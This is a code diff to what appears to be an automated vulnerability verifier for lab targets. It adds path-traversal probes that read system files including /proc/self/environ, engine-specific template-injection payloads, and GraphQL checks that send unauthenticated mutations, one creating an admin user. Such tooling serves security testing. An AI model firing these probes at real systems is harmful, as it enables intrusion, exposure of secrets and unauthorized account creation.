@@ -3288,6 +3288,56 @@ def verify_generic_path_traversal(
                           f"candidato(s) y ninguna devolvio el secreto plantado -- el traversal "
                           f"no se confirmo (puede necesitar otra profundidad/codificacion, o el "
                           f"endpoint/parametro no son los reales)")
+            # Backup file variant probe: when canary traversal fails, try reading known-static
+            # system files that always exist in a container — without planting any canary.
+            # Covers targets that strip/block random canary paths but serve /etc/hostname etc.
+            if not res.verified and win_ep and win_pp and tried_all:
+                _best_payload = next(
+                    (t.get("payload", "") for t in tried_all
+                     if t.get("status", 0) not in (0, 404, 500)), "")
+                if not _best_payload:
+                    _best_payload = next((t.get("payload", "") for t in tried_all), "")
+                if _best_payload:
+                    import re as _re_bk
+                    _depth_m2 = _re_bk.match(r'^((?:\.\./?|%2e%2e/?|%2E%2E/?|\.%2e/?)+)', _best_payload)
+                    _depth2 = _depth_m2.group(1) if _depth_m2 else "../" * 5
+                    _BACKUP_TARGETS = [
+                        ("etc/hostname", None),
+                        ("proc/version", "Linux version"),
+                        ("etc/os-release", "NAME="),
+                        ("proc/self/environ", None),
+                    ]
+                    for _btarget, _bmarker in _BACKUP_TARGETS:
+                        if res.verified:
+                            break
+                        _bpayload = _depth2 + _btarget
+                        try:
+                            import requests as _rq_bk
+                            _burl = base_url.rstrip("/") + "/" + win_ep.lstrip("/")
+                            if _url_path_mode:
+                                _bk_resp = _rq_bk.get(
+                                    _burl.rstrip("/") + "/" + _bpayload,
+                                    headers=dict(custom_headers or {}), timeout=10, allow_redirects=True)
+                            else:
+                                _bk_resp = _rq_bk.request(
+                                    (http_method or "GET").upper(), _burl,
+                                    params={win_pp: _bpayload} if (http_method or "GET").upper() == "GET" else None,
+                                    data={win_pp: _bpayload} if (http_method or "GET").upper() != "GET" else None,
+                                    headers=dict(custom_headers or {}), timeout=10, allow_redirects=True)
+                            _bb = _bk_resp.text if hasattr(_bk_resp, "text") else ""
+                            _ok = (_bk_resp.status_code == 200 and len(_bb.strip()) > 10 and
+                                   (_bmarker is None or _bmarker in _bb))
+                            if _ok:
+                                res.verified = True
+                                res.ok = True
+                                res.evidence["backup_file_read"] = {
+                                    "target": _btarget, "payload": _bpayload,
+                                    "body_snippet": _bb[:300]}
+                                res.detail = (f"PATH TRAVERSAL confirmado via archivo de sistema "
+                                              f"({_btarget}) con payload {_bpayload!r}")
+                                step(f"BACKUP FILE: {_btarget} accesible → traversal confirmed")
+                        except Exception:
+                            pass
         # LFI param fuzzing for generic verifier (like verify_wordpress_path_traversal)
         _gen_path_param = win_pp or path_param_hint or ""
         if (not res.verified and parameters
@@ -6235,7 +6285,43 @@ def verify_generic_ssti(
             f"}}{{{mul}}}{{", f"'}}{{{mul}}}{{'", f'"}}{{{mul}}}{{"',
             f"-}}{{{mul}}}{{-", f"\">{{{{{mul}}}}}<\"",
         ]
-        attempt_pairs = [(p, expected) for p in hand_made] + load_ssti_arithmetic_payloads(a, b)
+
+        # Engine-specific payload prioritization: detect template engine from source
+        # and prepend its characteristic payloads so they run first.
+        _engine_key = "generic"
+        _hint_text = " ".join([
+            (source_dir or ""),
+            str(setup_commands or ""),
+            str(dockerfile_body or ""),
+        ]).lower()
+        if any(x in _hint_text for x in ("jinja", "flask", "django", "mako")):
+            _engine_key = "jinja2"
+        elif any(x in _hint_text for x in ("twig", "laravel", "symfony")):
+            _engine_key = "twig"
+        elif any(x in _hint_text for x in ("freemarker", "ftl")):
+            _engine_key = "freemarker"
+        elif any(x in _hint_text for x in ("pebble",)):
+            _engine_key = "pebble"
+        elif any(x in _hint_text for x in ("smarty",)):
+            _engine_key = "smarty"
+        elif any(x in _hint_text for x in ("erb", "rails", "sinatra")):
+            _engine_key = "erb"
+        _ENGINE_FRONT_PAYLOADS = {
+            "jinja2":     [f"{{{{{mul}}}}}", "{{config}}", "{{''.__class__}}", f"${{{mul}}}"],
+            "twig":       [f"{{{{{mul}}}}}", f"{{% set x = {mul} %}}{{{{x}}}}", f"{{{{ {mul} }}}}"],
+            "freemarker": [f"${{{mul}}}", f"${{({mul})?int}}", f"<#assign x={mul}>${{x}}"],
+            "pebble":     [f"{{{{{mul}}}}}", f"{{% set x = {mul} %}}{{{{x}}}}"],
+            "smarty":     [f"{{{{{mul}}}}}", f"{{math equation=\"{mul}\"}}"],
+            "erb":        [f"<%= {mul} %>", f"#{{({mul})}}", f"<%={mul}%>"],
+            "generic":    [],
+        }
+        _front = _ENGINE_FRONT_PAYLOADS.get(_engine_key, [])
+        if _front and _engine_key != "generic":
+            step(f"SSTI: engine detected={_engine_key!r}, prepending {len(_front)} engine-specific payloads")
+        # Deduplicate: engine payloads first, then generic (without duplicates)
+        _hand_set = set(hand_made)
+        _extra_front = [(p, expected) for p in _front if p not in _hand_set]
+        attempt_pairs = _extra_front + [(p, expected) for p in hand_made] + load_ssti_arithmetic_payloads(a, b)
 
         m = (http_method or "GET").upper().split("/")[0].split("|")[0].strip() or "GET"
 
@@ -8042,6 +8128,25 @@ def verify_generic_graphql_bypass(
         endpoint_url = base_url.rstrip("/") + "/" + graphql_endpoint.lstrip("/")
         gql_headers = {"Content-Type": "application/json", "Accept": "application/json"}
 
+        # Step 0: try alternate GraphQL endpoint paths if the given one doesn't respond
+        _gql_ep_candidates = [graphql_endpoint]
+        for _alt_gql in ("/graphql", "/api/graphql", "/graphiql", "/graphql/v1",
+                         "/v1/graphql", "/query", "/gql"):
+            if _alt_gql != graphql_endpoint:
+                _gql_ep_candidates.append(_alt_gql)
+
+        _working_gql_ep = graphql_endpoint
+        for _gql_cand in _gql_ep_candidates:
+            _probe_intro = '{"query":"{ __schema { queryType { name } } }"}'
+            _s_p, _, _b_p = _http_lab(base_url, _gql_cand, "POST",
+                                       headers=gql_headers, body=_probe_intro.encode(), timeout=10.0)
+            if _s_p != 0 and _b_p is not None:
+                _working_gql_ep = _gql_cand
+                break
+        if _working_gql_ep != graphql_endpoint:
+            step(f"GraphQL: endpoint {graphql_endpoint!r} no responde; usando {_working_gql_ep!r}")
+            graphql_endpoint = _working_gql_ep
+
         # Step 1: introspección — confirmar que el endpoint GraphQL responde
         step(f"Paso 1: introspección GraphQL en {graphql_endpoint}")
         intro_query = '{"query":"{ __schema { queryType { name } } }"}'
@@ -8053,6 +8158,16 @@ def verify_generic_graphql_bypass(
             res.ok = True
             return res
         has_gql = b"__schema" in b_intro or b"queryType" in b_intro or s_intro == 200
+        # Anonymous introspection fully enabled = information disclosure by itself
+        _full_intro = b"__schema" in b_intro and b"types" in b_intro
+        if _full_intro and not confirm_field:
+            res.verified = True
+            res.ok = True
+            _intro_body = b_intro[:500].decode("utf-8", "replace")
+            res.evidence["graphql_introspection_anon"] = {"enabled": True, "body": _intro_body}
+            res.detail = ("GRAPHQL INTROSPECTION anonima habilitada — esquema completo accesible "
+                          "sin autenticacion (information disclosure confirmado)")
+            step("VERIFICADO: introspection anonima habilitada → confirmed")
         step(f"  introspección: status={s_intro} graphql={'SI' if has_gql else 'NO'}")
         res.evidence["intro_status"] = s_intro
         res.evidence["intro_body_recorte"] = b_intro[:200].decode("utf-8", "replace")
@@ -8121,6 +8236,33 @@ def verify_generic_graphql_bypass(
             res.ok = True
             res.detail = (f"el vector de bypass no confirmo acceso no autorizado al campo "
                           f"'{confirm_field}' — sin bypass: {s_anon}, con bypass: {s_byp}")
+            # Fallback: try unauthenticated mutation — proves write access without auth
+            if not res.verified:
+                _ANON_MUTATIONS = [
+                    '{"query":"mutation { createUser(input: {email: \\"t@t.com\\", password: \\"t\\", role: \\"admin\\"}) { id } }"}',
+                    '{"query":"mutation { register(email: \\"t@t.com\\", password: \\"t\\") { token } }"}',
+                    '{"query":"mutation { updateSetting(key: \\"debug\\", value: true) { ok } }"}',
+                ]
+                for _mut in _ANON_MUTATIONS:
+                    try:
+                        _ms, _, _mb = _http_lab(base_url, graphql_endpoint, "POST",
+                                                headers=gql_headers, body=_mut.encode(), timeout=10.0)
+                        _mb_str = (_mb or b"").decode("utf-8", "replace")
+                        _has_data = (bool(re.search(r'"data"\s*:\s*\{', _mb_str)) and
+                                     "null" not in _mb_str.split('"data"', 1)[-1][:60])
+                        _no_auth_err = not bool(re.search(
+                            r'(?i)(unauthorized|unauthenticated|not authorized|forbidden)', _mb_str))
+                        if _ms == 200 and _has_data and _no_auth_err:
+                            res.verified = True
+                            res.ok = True
+                            res.evidence["graphql_anon_mutation"] = {
+                                "mutation": _mut[:120], "status": _ms, "body": _mb_str[:300]}
+                            res.detail = ("GRAPHQL MUTATION sin autenticacion: mutation ejecutada "
+                                          "con exito sin credenciales (write access sin auth)")
+                            step("VERIFICADO: GraphQL mutation anonima exitosa → confirmed")
+                            break
+                    except Exception:
+                        pass
         return res
     except subprocess.TimeoutExpired as e:
         res.detail = _diagnose_infra_error(e, source_dir)
